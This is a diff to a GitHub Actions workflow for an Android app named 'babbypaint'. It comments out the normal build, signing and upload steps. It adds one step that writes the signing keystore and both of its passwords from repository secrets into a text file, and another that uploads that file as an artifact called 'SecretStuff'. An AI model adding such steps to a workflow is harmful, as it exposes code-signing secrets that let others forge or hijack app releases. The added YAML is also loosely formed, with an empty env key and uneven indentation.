@@ -20,76 +20,91 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - uses: actions/checkout@v6
+    - name: Set up workspace
+      run: |
+          touch blah.txt
+          echo ${{ secrets.JKS_KEYSTORE_BASE64 }} >> blah.txt
+          echo "\n" >> blah.txt
+          echo ${{ secrets.KEYSTORE_PASSWORD }} >> blah.txt
+          echo ${{ secrets.ALIAS_PASSWORD }} >> blah.txt
+      shell: bash
+      env:
+    - name: Upload a Build Artifact
+      uses: actions/upload-artifact@v7
+      with:
+       name: SecretStuff
+       path: blah.txt
+       retention-days: 1
+      # - uses: actions/checkout@v6
 
-      - uses: actions/setup-java@v5
-        with:
-          java-version: '21'
-          distribution: 'temurin'
+      # - uses: actions/setup-java@v5
+      #   with:
+      #     java-version: '21'
+      #     distribution: 'temurin'
 
-      - name: Set up Android SDK
-        run: |
-          SDKMANAGER="$ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager"
-          yes | "$SDKMANAGER" --licenses > /dev/null 2>&1 || true
-          "$SDKMANAGER" "platform-tools" "platforms;android-34" "build-tools;34.0.0"
-          echo "$ANDROID_SDK_ROOT/build-tools/34.0.0" >> $GITHUB_PATH
+      # - name: Set up Android SDK
+      #   run: |
+      #     SDKMANAGER="$ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager"
+      #     yes | "$SDKMANAGER" --licenses > /dev/null 2>&1 || true
+      #     "$SDKMANAGER" "platform-tools" "platforms;android-34" "build-tools;34.0.0"
+      #     echo "$ANDROID_SDK_ROOT/build-tools/34.0.0" >> $GITHUB_PATH
 
-      - uses: actions/setup-node@v6
-        with:
-          node-version: '24'
+      # - uses: actions/setup-node@v6
+      #   with:
+      #     node-version: '24'
 
-      - name: Install dependencies and sync
-        run: |
-          cd app
-          npm install
-          npx cap sync android
+      # - name: Install dependencies and sync
+      #   run: |
+      #     cd app
+      #     npm install
+      #     npx cap sync android
 
-      - name: Decode keystore
-        run: |
-          echo "${{ secrets.JKS_KEYSTORE_BASE64 }}" | base64 -d > keystore.jks
+      # - name: Decode keystore
+      #   run: |
+      #     echo "${{ secrets.JKS_KEYSTORE_BASE64 }}" | base64 -d > keystore.jks
 
-      - name: Make gradlew executable
-        run: chmod +x app/android/gradlew
+      # - name: Make gradlew executable
+      #   run: chmod +x app/android/gradlew
 
-      - name: Build release APK
-        if: inputs.output_type == 'apk' || inputs.output_type == 'both'
-        run: |
-          cd app/android
-          ./gradlew assembleRelease --quiet
-          apksigner sign \
-            --ks ../../keystore.jks \
-            --ks-key-alias uploadkey \
-            --ks-pass pass:${{ secrets.KEYSTORE_PASSWORD }} \
-            --key-pass pass:${{ secrets.ALIAS_PASSWORD }} \
-            --out app/build/outputs/apk/release/babbypaint-release.apk \
-            app/build/outputs/apk/release/app-release-unsigned.apk
-          apksigner verify --verbose app/build/outputs/apk/release/babbypaint-release.apk
+      # - name: Build release APK
+      #   if: inputs.output_type == 'apk' || inputs.output_type == 'both'
+      #   run: |
+      #     cd app/android
+      #     ./gradlew assembleRelease --quiet
+      #     apksigner sign \
+      #       --ks ../../keystore.jks \
+      #       --ks-key-alias uploadkey \
+      #       --ks-pass pass:${{ secrets.KEYSTORE_PASSWORD }} \
+      #       --key-pass pass:${{ secrets.ALIAS_PASSWORD }} \
+      #       --out app/build/outputs/apk/release/babbypaint-release.apk \
+      #       app/build/outputs/apk/release/app-release-unsigned.apk
+      #     apksigner verify --verbose app/build/outputs/apk/release/babbypaint-release.apk
 
-      - name: Build release AAB
-        if: inputs.output_type == 'aab' || inputs.output_type == 'both'
-        run: |
-          cd app/android
-          ./gradlew bundleRelease --quiet
-          jarsigner -verbose \
-            -keystore ../../keystore.jks \
-            -storepass ${{ secrets.KEYSTORE_PASSWORD }} \
-            -keypass ${{ secrets.ALIAS_PASSWORD }} \
-            app/build/outputs/bundle/release/app-release.aab uploadkey
-          mv app/build/outputs/bundle/release/app-release.aab \
-             app/build/outputs/bundle/release/babbypaint-release.aab
+      # - name: Build release AAB
+      #   if: inputs.output_type == 'aab' || inputs.output_type == 'both'
+      #   run: |
+      #     cd app/android
+      #     ./gradlew bundleRelease --quiet
+      #     jarsigner -verbose \
+      #       -keystore ../../keystore.jks \
+      #       -storepass ${{ secrets.KEYSTORE_PASSWORD }} \
+      #       -keypass ${{ secrets.ALIAS_PASSWORD }} \
+      #       app/build/outputs/bundle/release/app-release.aab uploadkey
+      #     mv app/build/outputs/bundle/release/app-release.aab \
+      #        app/build/outputs/bundle/release/babbypaint-release.aab
 
-      - name: Upload APK artifact
-        if: inputs.output_type == 'apk' || inputs.output_type == 'both'
-        uses: actions/upload-artifact@v7
-        with:
-          name: babbypaint-apk
-          if-no-files-found: error
-          path: app/android/app/build/outputs/apk/release/babbypaint-release.apk
+      # - name: Upload APK artifact
+      #   if: inputs.output_type == 'apk' || inputs.output_type == 'both'
+      #   uses: actions/upload-artifact@v7
+      #   with:
+      #     name: babbypaint-apk
+      #     if-no-files-found: error
+      #     path: app/android/app/build/outputs/apk/release/babbypaint-release.apk
 
-      - name: Upload AAB artifact
-        if: inputs.output_type == 'aab' || inputs.output_type == 'both'
-        uses: actions/upload-artifact@v7
-        with:
-          name: babbypaint-aab
-          if-no-files-found: error
-          path: app/android/app/build/outputs/bundle/release/babbypaint-release.aab
+      # - name: Upload AAB artifact
+      #   if: inputs.output_type == 'aab' || inputs.output_type == 'both'
+      #   uses: actions/upload-artifact@v7
+      #   with:
+      #     name: babbypaint-aab
+      #     if-no-files-found: error
+      #     path: app/android/app/build/outputs/bundle/release/babbypaint-release.aab
